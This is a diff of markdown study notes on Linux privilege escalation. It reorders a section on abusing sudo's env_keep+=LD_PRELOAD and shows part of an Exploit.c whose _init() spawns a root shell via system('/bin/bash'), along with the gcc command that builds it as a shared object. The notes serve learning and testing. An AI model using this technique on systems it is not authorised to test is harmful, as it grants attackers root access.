@@ -15,17 +15,6 @@ You can use ```https://gtfobins.org/``` to check what applications might bypass 
 Using **sudo -l** you an option may be avaiable called ```env_keep+=LD_PRELOAD``` which is another possible priviledge escalation method.
 
 
-Complie this text as a shared extension
-**gcc -fPIC -shared -o Exploit.so Exploit.c -nostartfiles**
-
-- *fPIC	Generates Position-Independent Code required for shared libraries.*
-- *-shared	compiles to a shared object .so*
-- *-o Exploit.so    |output filename.*
-- *Exploit.c    |input file.*
-- *nostartfiles	Prevents standard startup routines so _init() executes immediately.*
-
-
-
 Name *Exploit.c*
 ```
 #include <stdio.h>
@@ -40,6 +29,14 @@ void _init() {
     system("/bin/bash");     // Spawn a root shell
 }
 ```
+Complie this text as a shared extension
+**gcc -fPIC -shared -o Exploit.so Exploit.c -nostartfiles**
+
+- *fPIC	Generates Position-Independent Code required for shared libraries.*
+- *-shared	compiles to a shared object .so*
+- *-o Exploit.so    |output filename.*
+- *Exploit.c    |input file.*
+- *nostartfiles	Prevents standard startup routines so _init() executes immediately.*
 
 
 ## SUID
